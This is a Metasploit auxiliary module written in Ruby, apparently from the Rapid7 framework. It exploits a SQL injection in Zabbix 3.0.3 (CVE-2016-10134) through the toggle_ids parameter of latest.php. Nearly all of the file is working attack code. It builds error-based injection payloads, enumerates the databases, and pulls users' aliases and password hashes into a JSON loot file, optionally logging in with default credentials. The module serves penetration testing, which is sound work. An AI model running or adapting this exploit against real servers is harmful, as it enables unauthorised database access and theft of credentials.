##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Zabbix toggle_ids SQL Injection',
      'Description'    => %q{
      This module will exploit a SQL injection in Zabbix 3.0.3 and
      likely prior in order to save the current usernames and
      password hashes from the database to a JSON file.
      },
      'References'     =>
        [
          ['CVE', '2016-10134'],
          ['URL', 'https://seclists.org/fulldisclosure/2016/Aug/60']
        ],
      'Author'         =>
        [
          '1n3@hushmail.com', #discovery
          'bperry' #module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Aug 11 2016'
    ))

    register_options(
      [
        OptBool.new('REQUIREAUTH', [true, 'Enforce authentication', false]),
        OptString.new('USERNAME', [false, 'The username to authenticate with', 'Admin']),
        OptString.new('PASSWORD', [false, 'The password to authenticate with', 'zabbix']),
        OptString.new('TARGETURI', [true, 'The relative URI for Zabbix', '/zabbix'])
      ])
  end

  def default_cred?
    true
  end

  def check

    sid, cookies = authenticate

    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    query = "AND (SELECT 1256 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
    query << ",(SELECT MID((IFNULL(CAST(0x#{flag.unpack("H*")[0]} AS CHAR),0x20)),1,54)"
    query << " FROM dual LIMIT 0,1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM"
    query << ' INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'

    res = make_injected_request(query, sid, cookies)

    unless res and res.body
      return Msf::Exploit::CheckCode::Safe
    end

    match = /#{left_marker}(.*)#{right_marker}/.match(res.body)

    unless match
      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
    end

    if match[1] == flag
      return Msf::Exploit::CheckCode::Vulnerable
    end

    Msf::Exploit::CheckCode::Safe
  end

  def run
    sid, cookies = authenticate

    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    query = " AND (SELECT 5361 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
    query << ",(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM"
    query << " INFORMATION_SCHEMA.SCHEMATA),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x"
    query << " FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    res = make_injected_request(query, sid, cookies)

    unless res and res.body
      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
    end

    match = /#{left_marker}(.*)#{right_marker}/.match(res.body)

    unless match
      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
    end

    count = match[1].to_i

    dbs = []
    0.upto(count-1) do |cur|

      get_dbs = " AND (SELECT 5184 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
      get_dbs << ",(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54)"
      get_dbs << " FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{cur},1),0x#{right_marker.unpack("H*")[0]},"
      get_dbs << "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

      res = make_injected_request(get_dbs, sid, cookies)

      unless res and res.body
        fail_with(Failure::Unknown, 'Server did not respond in an expected way')
      end

      match = /#{left_marker}(.*)#{right_marker}/.match(res.body)

      unless match
        fail_with(Failure::Unknown, 'Server did not respond in an expected way')
      end

      dbs << match[1]
    end

    dbs.delete("mysql")
    dbs.delete("performance_schema")
    dbs.delete("information_schema")

    users = []
    dbs.each do |db|
      cols = ["alias", "passwd"]

      user_count = " AND (SELECT 6262 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
      user_count << ",(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM"
      user_count << " #{db}.users),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM"
      user_count << " INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

      res = make_injected_request(user_count, sid, cookies)

      unless res and res.body
        fail_with(Failure::Unknown, 'Server did not respond in an expected way')
      end

      match = /#{left_marker}(.*)#{right_marker}/.match(res.body)

      unless match
        fail_with(Failure::Unknown, 'Server did not respond in an expected way')
      end

      count = match[1].to_i

      0.upto(count-1) do |cur|
        user = {}
        cols.each do |col|
          get_col = " AND (SELECT 6334 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
          get_col << ",(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),1,54)"
          get_col << " FROM #{db}.users ORDER BY alias LIMIT #{cur},1),0x#{right_marker.unpack("H*")[0]}"
          get_col << ',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'

          res = make_injected_request(get_col, sid, cookies)

          unless res and res.body
            fail_with(Failure::Unknown, 'Server did not respond in an expected way')
          end

          match = /#{left_marker}(.*)#{right_marker}/.match(res.body)

          unless match
            fail_with(Failure::Unknown, 'Server did not respond in an expected way')
          end

          user[col] = match[1]
        end
        users << user
      end
    end

    loot = store_loot("zabbixusers.json","text/plain", rhost, users.to_json)

    print_good('Users and password hashes stored at ' + loot)

  end

  def authenticate
   res = send_request_cgi({
     'uri' => normalize_uri(target_uri.path, 'index.php')
   })

   unless res and res.body
     fail_with(Failure::Unknown, 'Server did not respond in an expected way')
   end

   cookies = res.get_cookies

   match = /name="sid" value="(.*?)">/.match(res.body)

   unless match
     fail_with(Failure::Unknown, 'Server did not respond in an expected way')
   end

   sid = match[1]

   if datastore['REQUIREAUTH']

     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php'),
       'method' => 'POST',
       'vars_post' => {
         'sid' => sid,
         'form_refresh' => 1,
         'name' => datastore['USERNAME'],
         'password' => datastore['PASSWORD'],
         'autologin' => 1,
         'enter' => 'Sign in'
       },
       'cookie' => cookies
     })

     unless res
       fail_with(Failure::Unknown, 'Server did not respond in an expected way')
     end

     if res.code == 302
       cookies = res.get_cookies

       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'latest.php'),
         'vars_get' => {
          'ddreset' => '1'
         },
         'cookies' => cookies
       })

       unless res and res.body
         fail_with(Failure::Unknown, 'Server did not respond in an expected way')
       end

       cookies = res.get_cookies
       match = /name="sid" value="(.*?)">/.match(res.body)

       unless match
         fail_with(Failure::Unknown, 'Server did not respond in an expected way')
       end

       sid = match[1]
     elsif
       fail_with(Failure::Unknown, 'Server did not respond in an expected way')
     end
   end

   return sid, cookies
  end

  def make_injected_request(sql, sid, cookies)
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'latest.php'),
      'method' => 'POST',
      'vars_get' => {
        'output' => 'ajax',
        'sid' => sid
      },
      'vars_post' => {
        'favobj' => 'toggle',
        'toggle_ids[]' => '348 ' + sql,
        'toggle_open_state' => 0
      },
      'cookie' => cookies
    })
  end
end
